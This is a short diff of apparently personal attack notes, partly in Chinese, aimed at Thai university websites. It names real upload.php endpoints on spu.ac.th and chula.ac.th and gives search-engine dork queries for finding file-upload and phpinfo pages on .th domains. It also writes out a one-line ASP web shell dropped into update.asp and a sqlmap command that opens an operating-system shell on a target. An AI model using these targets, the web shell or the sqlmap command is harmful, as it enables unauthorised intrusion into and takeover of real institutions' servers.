@@ -1,0 +1,17 @@
+https://www.spu.ac.th/upload.php?action=upfile
+
+
+如何查找文件上传接口?
+对测试的网站利用谷歌语法取交集
+site: inurl:upload.php
+语法错误，百度解决
+site: www.spu.ac.th && inurl:upload.php
+site: .th && inurl:phpinfo.php
+
+https://www.pharm.chula.ac.th/pharm/index.php?main_id=39&sub_id=293
+
+
+echo ^<%Execute(request("pio"))%^> > update.asp
+
+
+python27  sqlmap.py -r C:/Users/Pio/Desktop/data/aa.txt --os-shell -v 3
